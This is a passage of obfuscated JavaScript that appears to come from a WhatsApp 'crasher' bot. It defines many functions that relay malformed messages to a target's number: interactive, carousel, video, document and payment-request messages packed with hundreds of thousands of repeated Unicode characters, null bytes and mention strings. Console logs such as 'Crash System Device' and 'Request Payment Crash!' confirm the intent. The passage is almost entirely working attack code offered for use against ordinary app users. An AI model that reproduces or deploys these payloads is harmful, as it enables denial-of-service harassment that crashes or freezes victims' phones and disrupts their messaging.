            stanzaId: "1234567890ABCDEF",
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              callLogMesssage: {
                isVideo: true,
                callOutcome: "1",
                durationSecs: "0",
                callType: "REGULAR",
                participants: [{
                  jid: "0@s.whatsapp.net",
                  callOutcome: "1"
                }]
              }
            },
            remoteJid: _0x326425,
            conversionSource: "source_example",
            conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
            conversionDelaySeconds: 10,
            forwardingScore: 99999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: "Example Advertiser",
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
              caption: "This is an ad caption"
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            },
            expiration: 86400,
            ephemeralSettingTimestamp: "1728090592378",
            ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
            externalAdReply: {
              title: "INFINITY - CRASHER",
              body: "⩟⬦𪲁 ��-�� -\0\0\0" + "ꦾ".repeat(90000),
              mediaType: "VIDEO",
              renderLargerThumbnail: true,
              previewTtpe: "VIDEO",
              thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
              sourceType: " v ",
              sourceId: " v ",
              sourceUrl: "https://www.instagram.com/WhatsApp",
              mediaUrl: "https://www.instagram.com/WhatsApp",
              containsAutoReply: true,
              renderLargerThumbnail: true,
              showAdAttribution: true,
              ctwaClid: "ctwa_clid_example",
              ref: "ref_example"
            },
            entryPointConversionSource: "entry_point_source_example",
            entryPointConversionApp: "entry_point_app_example",
            entryPointConversionDelaySeconds: 5,
            disappearingMode: {},
            actionLink: {
              url: "https://www.instagram.com/WhatsApp"
            },
            groupSubject: "Example Group Subject",
            parentGroupJid: "0-0@g.us",
            trustBannerType: "trust_banner_example",
            trustBannerAction: 1,
            isSampled: false,
            utm: {
              utmSource: "utm_source_example",
              utmCampaign: "utm_campaign_example"
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "0-0@g.us",
              serverMessageId: 1,
              newsletterName: " CRASHER ",
              contentType: "UPDATE",
              accessibilityText: " CRASHER "
            },
            businessMessageForwardInfo: {
              businessOwnerJid: "0@s.whatsapp.net"
            },
            smbClientCampaignId: "smb_client_campaign_id_example",
            smbServerCampaignId: "smb_server_campaign_id_example",
            dataSharingContext: {
              showMmDisclosure: true
            }
          }
        }
      }, _0x2e5f1d ? {
        participant: {
          jid: _0x326425
        }
      } : {});
    }
    async function _0x149690(_0x4988b7) {
      _0x4b53e5.relayMessage(_0x4988b7, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0
                },
                hasMediaAttachment: true
              },
              body: {
                text: "Chucky's Christmas" + "ꦾ".repeat(120000) + "@1".repeat(250000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: "𝐊𝐈𝐋𝐋𝚵𝐑𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕"
                }]
              }
            }
          }
        }
      }, {
        participant: {
          jid: _0x4988b7
        }
      }, {
        messageId: null
      });
      await new Promise(_0x59b6ff => setTimeout(_0x59b6ff, 2000));
    }
    async function _0x8c2c8e(_0x4d3e4f) {
      _0x4b53e5.relayMessage(_0x4d3e4f, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0
                },
                hasMediaAttachment: true
              },
              body: {
                text: "I Love You.., But... You Looser" + "ꦾ".repeat(50000) + "@1".repeat(120000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: "𝐊𝐈𝐋𝐋𝚵𝐑𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕"
                }]
              }
            }
          }
        }
      }, {
        participant: {
          jid: _0x4d3e4f
        }
      }, {
        messageId: null
      });
      await new Promise(_0x1d3ae4 => setTimeout(_0x1d3ae4, 2000));
    }
    async function _0x113b89(_0x23a94e) {
      _0x4b53e5.relayMessage(_0x23a94e, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0
                },
                hasMediaAttachment: true
              },
              body: {
                text: "⿻ᬃ𝐂𝐇𝐑𝐈𝐒𝐓𝐌𝐀𝐒 𝐂𝐑𝐀𝐒𝐇𝐄𝐑⃟⿻" + "ꦾ".repeat(120000) + "@1".repeat(250000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: "𝐊𝐈𝐋𝐋𝚵𝐑𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕"
                }]
              }
            }
          }
        }
      }, {
        participant: {
          jid: _0x23a94e
        }
      }, {
        messageId: null
      });
      await new Promise(_0x54b970 => setTimeout(_0x54b970, 2000));
    }
    async function _0x1c67c4(_0x1e6c6a, _0x1961a8) {
      try {
        const _0x55e564 = generateWAMessageFromContent(_0x1e6c6a, proto.Message.fromObject({
          videoMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/32600320_1359746598331420_5186781147629135099_n.enc?ccb=11-4&oh=01_Q5AaIJrw3rMcUPjfaHMUAnAjywjLgHwu-ufclRPU54jupBZb&oe=6768433F&_nc_sid=5e03e0&mms3=true",
            mimetype: "video/mp4",
            fileSha256: "NwQaS3YczNRl5lHhBZ5fo6RfNbO1iB8r0hqtKYMguQA=",
            fileLength: "5113321",
            mediaKey: "Nt9lZ1+Rjy/MH91bbYq3EJ3jsFSooUfpXDKRv/nIMHk=",
            caption: "BOOM IM HERE BRO\0" + "ꦾ".repeat(55000) + "@1".repeat(75000),
            gifPlayback: true,
            fileEncSha256: "ztwwbXAv4IQnyzzrJJqVLqtXb9azUP09llxVmjeh5TA=",
            directPath: "/v/t62.7161-24/32600320_1359746598331420_5186781147629135099_n.enc?ccb=11-4&oh=01_Q5AaIJrw3rMcUPjfaHMUAnAjywjLgHwu-ufclRPU54jupBZb&oe=6768433F&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1732298375",
            jpegThumbnail: "/9j//gAQTGF2YzU4LjkxLjEwMAD/2wBDAAgEBAQEBAUFBQUFBQYGBgYGBgYGBgYGBgYHBwcICAgHBwcGBgcHCAgICAkJCQgICAgJCQoKCgwMCwsODg4RERT/xABhAAEBAQEBAAAAAAAAAAAAAAACAQADBwEBAQAAAAAAAAAAAAAAAAAAAAEQAAEDBAICAwEAAAAAAAAAAAABAoGxETIDofAT0WExUSERAQEBAQAAAAAAAAAAAAAAAAABEVH/wAARCAAnACADASIAAhEAAxEA/9oADAMBAAIRAxEAPwDwZPopGLdqTUpdvV29YOzBYqIO3BYqNvTb1tWCTUQdf8Yk1ERGuHbgsVEHbgsVAKbmolrL2S+Zvzx7ORgOvnb+Lx7I/a1zVSy9k5mA/9k=",
            gifAttribution: "NONE"
          }
        }), {
          userJid: _0x1e6c6a,
          quoted: _0x1961a8
        });
        await _0x4b53e5.relayMessage(_0x1e6c6a, _0x55e564.message, {
          participant: {
            jid: _0x1e6c6a,
            quoted: _0x1961a8
          },
          messageId: _0x55e564.key.id
        });
        console.log(_0x3e6b4d.green("Sending Bug Giff"));
      } catch (_0x151ea0) {
        console.error("Error ngirim pesan:", _0x151ea0);
      }
    }
    async function _0x4330db(_0x46dc3c) {
      _0x4b53e5.relayMessage(_0x46dc3c, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0
                },
                hasMediaAttachment: true
              },
              body: {
                text: "⩟⬦𪲁 ��-�� -\0\0\0" + "ꦾ".repeat(120000) + "@1".repeat(250000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: "𝐊𝐈𝐋𝐋𝚵𝐑𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕"
                }]
              }
            }
          }
        }
      }, {
        participant: {
          jid: _0x46dc3c
        }
      }, {
        messageId: null
      });
    }
    async function _0x47cb93(_0x1b8965) {
      let _0x1878ba = "⿻ᬃ𝐂𝐇𝐑𝐈𝐒𝐓𝐌𝐀𝐒 𝐂𝐑𝐀𝐒𝐇𝐄𝐑⃟⿻";
      await _0x4b53e5.relayMessage(_0x1b8965, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0
                },
                hasMediaAttachment: true
              },
              body: {
                text: "Chucky's Christmas" + "@1".repeat(90000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: "𝐊𝐈𝐋𝐋𝚵𝐑𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕"
                }]
              }
            }
          }
        }
      }, {
        participant: {
          jid: _0x1b8965
        }
      }, {
        messageId: null
      });
    }
    async function _0x495699(_0x2be8e6) {
      await _0x4b53e5.relayMessage(_0x2be8e6, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0
                },
                hasMediaAttachment: true
              },
              body: {
                text: "FLOODS ACTIVE" + "\0".repeat(1000) + "ꦾ".repeat(103000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: " 𝐊𝐈𝐋𝐋𝚵𝐑𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕 "
                }]
              }
            }
          }
        }
      }, {
        participant: {
          jid: _0x2be8e6
        }
      }, {
        messageId: null
      });
    }
    async function _0xc5953d(_0x5b7ce4) {
      let _0x124fcb = {
        key: {
          fromMe: false,
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast"
        },
        message: {
          documentMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
            fileLength: "999999999",
            pageCount: 9999999999999,
            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
            fileName: "@chuckychristmascrasher\0" + "ꦾ".repeat(103000),
            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
            directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1715880173",
            contactVcard: true
          }
        }
      };
      const _0x3b6258 = {
        quoted: _0x124fcb
      };
      await _0x4b53e5.sendMessage(_0x5b7ce4, {
        text: "😂😹"
      }, _0x3b6258);
    }
    async function _0x14aa93(_0x209595, _0x42871c, _0x5c1afd = true) {
      const _0x3fdf99 = {
        upload: _0x4b53e5.waUploadToServer
      };
      const _0x1d70d2 = proto.Message.InteractiveMessage.Header.create({
        ...(await prepareWAMessageMedia({
          image: {
            url: "https://pomf2.lain.la/f/xq1r1r9q.jpg"
          }
        }, _0x3fdf99)),
        title: "⩟ - 𝗧𝗮𝗺𝗮 𝗖𝗿𝗮𝘀𝗵𝗲𝗿 ϟ" + "ꦾ".repeat(100000),
        subtitle: "⿻ᬃ𝐂𝐇𝐑𝐈𝐒𝐓𝐌𝐀𝐒 𝐂𝐑𝐀𝐒𝐇𝐄𝐑⃟⿻",
        hasMediaAttachment: true
      });
      const _0x4b9be7 = {
        text: "\0" + "ꦾ".repeat(90000)
      };
      const _0x3325b6 = {
        sections: [{
          title: " ⩟ - 𝗧𝗮𝗺𝗮 𝗥𝘆𝘂𝗶𝗰𝗵𝗶 ϟ ",
          rows: [{
            title: " ϟ 𝐓𝐚𝐦𝐚 𝐑𝐲𝐮𝐢𝐜𝐡𝐢 𝐊𝐢𝐥𝐥 ϟ",
            description: "ꦾ".repeat(55555),
            rowId: "@1".repeat(55555)
          }, {
            title: " ϟ ",
            description: "ꦾ".repeat(55555),
            rowId: "@1".repeat(55555)
          }]
        }, {
          title: " ⩟ - 𝗧𝗮𝗺𝗮 𝗥𝘆𝘂𝗶𝗰𝗵𝗶 ϟ ",
          rows: [{
            title: " ϟ 𝐓𝐚𝐦𝐚 𝐑𝐲𝐮𝐢𝐜𝐡𝐢 𝐊𝐢𝐥𝐥 ϟ",
            description: "ꦾ".repeat(55555),
            rowId: "@1".repeat(55555)
          }, {
            title: " ϟ ",
            description: "ꦾ".repeat(55555),
            rowId: "@1".repeat(55555)
          }]
        }]
      };
      const _0x1528d0 = {
        header: _0x1d70d2,
        body: _0x4b9be7,
        carouselMessage: _0x3325b6
      };
      const _0x5f50f0 = {
        interactiveMessage: _0x1528d0
      };
      const _0x4948ef = {
        message: _0x5f50f0
      };
      const _0x222a43 = {
        ephemeralMessage: _0x4948ef
      };
      await _0x4b53e5.relayMessage(_0x209595, _0x222a43, _0x5c1afd ? {
        participant: {
          jid: _0x209595
        }
      } : {});
      console.log(_0x3e6b4d.blue.bold("Carousel Active : Start Processing Crash!"));
    }
    async function _0x378c0d(_0x200017, _0x41e00d, _0x1c8432 = true) {
      const _0x354797 = {
        locationMessage: {
          degreesLatitude: 0,
          degreesLongitude: 0
        },
        hasMediaAttachment: true
      };
      const _0x4a3ed7 = {
        text: "\0" + "ꦾ".repeat(90000)
      };
      const _0x56192d = {
        sections: [{
          title: " ϟ ",
          rows: [{
            title: " ϟ ",
            description: " ",
            rowId: ".crasher"
          }, {
            title: " ϟ ",
            description: " ",
            rowId: ".crasher"
          }]
        }, {
          title: "Section 2",
          rows: [{
            title: " ϟ ",
            description: " ",
            rowId: ".crasher"
          }, {
            title: " ϟ ",
            description: " ",
            rowId: ".crasher"
          }]
        }]
      };
      const _0x452680 = {
        header: _0x354797,
        body: _0x4a3ed7,
        carouselMessage: _0x56192d
      };
      const _0x5f5680 = {
        interactiveMessage: _0x452680
      };
      const _0x2fc08f = {
        message: _0x5f5680
      };
      const _0x5c3de3 = {
        ephemeralMessage: _0x2fc08f
      };
      const _0x3670a8 = {
        quoted: _0x41e00d
      };
      await _0x4b53e5.relayMessage(_0x200017, _0x5c3de3, _0x1c8432 ? {
        participant: {
          jid: _0x200017
        }
      } : _0x3670a8);
      console.log(_0x3e6b4d.blue.bold("Carousel Active : Start Processing Crash!"));
    }
    async function _0x1d7cd7(_0x577688) {
      const _0x172359 = {
        interactiveMessage: {
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: JSON.stringify({
                currency: "IDR",
                external_payment_configurations: [{
                  type: "payment_instruction",
                  payment_instruction: "I Love You...\0"
                }],
                total_amount: {
                  value: 5000000000,
                  offset: 100
                },
                reference_id: "4QIX5UWRU72",
                type: "physical-goods",
                order: {
                  status: "payment_requested",
                  subtotal: {
                    value: 0,
                    offset: 100
                  },
                  order_type: "PAYMENT_REQUEST",
                  items: [{
                    retailer_id: "custom-item-05e67ff1-9ae5-4ef3-b25f-5ffb83c030d7",
                    name: "I Love You...\0" + "ꦾ".repeat(55550),
                    amount: {
                      value: 5000000000,
                      offset: 100
                    },
                    quantity: 1
                  }]
                },
                additional_note: "I Love You...\0",
                native_payment_methods: [],
                share_payment_status: false
              })
            }]
          }
        }
      };
      await _0x4b53e5.relayMessage(_0x577688, _0x172359, {
        participant: {
          jid: _0x577688
        },
        messageId: null
      });
    }
    async function _0x29a740(_0x136005) {
      try {
        const _0x2a6e5a = {
          interactiveMessage: {
            nativeFlowMessage: {
              buttons: [{
                name: "review_and_pay",
                buttonParamsJson: JSON.stringify({
                  currency: "IDR",
                  external_payment_configurations: [{
                    type: "payment_instruction",
                    payment_instruction: "I Love You...\0"
                  }],
                  total_amount: {
                    value: 5000000000,
                    offset: 100
                  },
                  reference_id: "4QIX5UWRU72",
                  type: "physical-goods",
                  order: {
                    status: "payment_requested",
                    subtotal: {
                      value: 0,
                      offset: 100
                    },
                    order_type: "PAYMENT_REQUEST",
                    items: [{
                      retailer_id: "custom-item-05e67ff1-9ae5-4ef3-b25f-5ffb83c030d7",
                      name: "I Love You...\0" + "ꦾ".repeat(90000),
                      amount: {
                        value: 5000000000,
                        offset: 100
                      },
                      quantity: 1
                    }]
                  },
                  additional_note: "I Love You...\0",
                  native_payment_methods: [],
                  share_payment_status: true
                })
              }]
            }
          }
        };
        await _0x4b53e5.relayMessage(_0x136005, _0x2a6e5a);
        console.log("Payment message sent successfully");
      } catch (_0x45789d) {
        console.error("Failed to send payment message:", _0x45789d);
      }
    }
    async function _0x5f2e51(_0x253f52) {
      await _0x4b53e5.relayMessage(_0x253f52, {
        interactiveMessage: {
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"external_payment_configurations\":[{\"type\":\"payment_instruction\",\"payment_instruction\":\"I Love You...\"}],\"total_amount\":{\"value\":5000000000,\"offset\":100},\"reference_id\":\"4QIX5UWRU72\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-05e67ff1-9ae5-4ef3-b25f-5ffb83c030d7\",\"name\":\"I Love You...\",\"amount\":{\"value\":5000000000,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"I Love You...\",\"native_payment_methods\":[],\"share_payment_status\":false}"
            }]
          }
        }
      }, {
        participant: {
          jid: _0x253f52
        }
      });
    }
    async function _0x2955f5(_0x5df759) {
      const _0x5c3d36 = {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                  name: "#𝗧𝗮𝗺𝗮𝗥𝘆𝘂𝗶𝗰𝗵𝗶 ~",
                  url: "https://wa.me/settings",
                  jpegThumbnail: ""
                },
                hasMediaAttachment: true
              },
              body: {
                text: "⩟⬦𪲁 ��-�� -\0\0\0" + "ꦾ".repeat(90000)
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "review_and_pay",
                  buttonParamsJson: JSON.stringify({
                    currency: "IDR",
                    total_amount: {
                      value: 6100,
                      offset: 100
                    },
                    reference_id: "4Q79X9PCBEM",
                    type: "physical-goods",
                    order: {
                      status: "completed",
                      subtotal: {
                        value: 0,
                        offset: 100
                      },
                      order_type: "PAYMENT_REQUEST",
                      items: [{
                        retailer_id: "custom-item-7fca9870-8e3a-4a4a-bfb7-8a07fbf5fa9e",
                        name: "\0" + "ꦾ".repeat(90000),
                        amount: {
                          value: 6100,
                          offset: 100
                        },
                        quantity: 1
                      }]
                    },
                    additional_note: "🔪🩸⚰️",
                    native_payment_methods: [],
                    share_payment_status: true
                  })
                }]
              },
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: "𝐊𝐈𝐋𝐋𝚵𝐑𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕"
                }],
                isForwarded: true,
                quotedMessage: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{\n                                        \"screen_2_OptIn_0\": true,\n                                        \"screen_2_OptIn_1\": true,\n                                        \"screen_1_Dropdown_0\": \"XXX\",\n                                        \"screen_1_DatePicker_1\": \"1028995200000\",\n                                        \"screen_1_TextInput_2\": \"FXT@janelle.com\",\n                                        \"screen_1_TextInput_3\": \"94643116\",\n                                        \"screen_0_TextInput_0\": \"" + "".repeat(700000) + "\",\n                                        \"screen_0_TextInput_1\": \"Why?\",\n                                        \"screen_0_Dropdown_2\": \"001-Grimgar\",\n\n\"screen_0_RadioButtonsGroup_3\": \"0_true\",\n                                        \"flow_token\": \"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"\n                                    }",
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      };
      _0x4b53e5.relayMessage(_0x5df759, _0x5c3d36, {
        participant: {
          jid: _0x5df759
        }
      }, {
        messageId: null
      });
      console.log(_0x3e6b4d.red.bold(" Chucky Christmas crasher sending bugs"));
    }
    async function _0x227f72(_0x40c579) {
      try {
        const _0x3f4ad9 = {
          upload: _0x4b53e5.waUploadToServer
        };
        var _0x1334be = generateWAMessageFromContent(_0x40c579, {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                body: {
                  text: "𝘠𝘖𝘜 𝘒𝘕𝘖𝘞 !, 𝘊𝘈𝘓𝘓 𝘔𝘌 𝘙𝘠𝘜𝘐𝘊𝘏𝘐 !\0" + "ꦾ".repeat(90000)
                },
                carouselMessage: {
                  cards: [{
                    header: {
                      hasMediaAttachment: true,
                      ...(await prepareWAMessageMedia({
                        image: {
                          url: "https://pomf2.lain.la/f/xq1r1r9q.jpg"
                        }
                      }, _0x3f4ad9))
                    },
                    body: {
                      text: "\0" + "ꦾ".repeat(90000)
                    },
                    nativeFlowMessage: {
                      buttons: [{
                        name: "cta_url",
                        buttonParamsJson: JSON.stringify({
                          display_text: "⿻ᬃ𝐂𝐇𝐑𝐈𝐒𝐓𝐌𝐀𝐒 𝐂𝐑𝐀𝐒𝐇𝐄𝐑⃟⿻",
                          url: "https://youtube.com/@marxalone",
                          merchant_url: "https://youtube.com/@marxalone"
                        })
                      }, {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                          title: "⿻ᬃ𝐂𝐇𝐑𝐈𝐒𝐓𝐌𝐀𝐒 𝐂𝐑𝐀𝐒𝐇𝐄𝐑⃟⿻",
                          sections: [{
                            title: "#KCV7   ~",
                            rows: []
                          }]
                        })
                      }, {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                          display_text: "⿻ᬃ𝐂𝐇𝐑𝐈𝐒𝐓𝐌𝐀𝐒 𝐂𝐑𝐀𝐒𝐇𝐄𝐑⃟⿻",
                          title: "CRASH!",
                          id: ".crasher"
                        })
                      }]
                    }
                  }],
                  messageVersion: 1
                }
              }
            }
          }
        }, {
          userJid: _0x40c579
        });
        await _0x4b53e5.relayMessage(_0x40c579, _0x1334be.message, {
          participant: {
            jid: _0x40c579
          },
          messageId: _0x1334be.key.id
        });
        console.log(_0x3e6b4d.red.bold("Crash System Device"));
      } catch (_0x439ee0) {
        console.error("An error occurred:", _0x439ee0);
      }
    }
    async function _0x16b6a1(_0xb8a21e) {
      const _0x35134a = {
        interactiveMessage: {
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: JSON.stringify({
                currency: "IDR",
                payment_configuration: "",
                payment_type: "",
                total_amount: {
                  value: 974100000,
                  offset: 100
                },
                reference_id: "4QJW5GSMUDS",
                type: "physical-goods",
                order: {
                  status: "payment_requested",
                  description: "",
                  subtotal: {
                    value: 0,
                    offset: 100
                  },
                  order_type: "PAYMENT_REQUEST",
                  items: [{
                    retailer_id: "custom-item-b838d773-83df-4183-9095-55fb5ef58443",
                    name: " Ryuichi Crash " + " ꦾ ".repeat(103000),
                    amount: {
                      value: 974100000,
                      offset: 100
                    },
                    quantity: 1
                  }]
                },
                additional_note: " 𝐊𝐈𝐋𝐋𝚵𝐑𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕 " + "\0".repeat(1000),
                native_payment_methods: [],
                share_payment_status: true
              })
            }]
          }
        }
      };
      const _0x5ba8f2 = generateWAMessageFromContent(_0xb8a21e, proto.Message.fromObject(_0x35134a), {
        userJid: _0xb8a21e
      });
      await _0x4b53e5.relayMessage(_0xb8a21e, _0x5ba8f2.message, {
        participant: {
          jid: _0xb8a21e
        },
        messageId: _0x5ba8f2.key.id
      });
      console.log(_0x3e6b4d.white.bold(" Request Payment Crash! "));
    }
    async function _0x419020(_0x2d7d7f) {
      const _0x1e71b7 = {
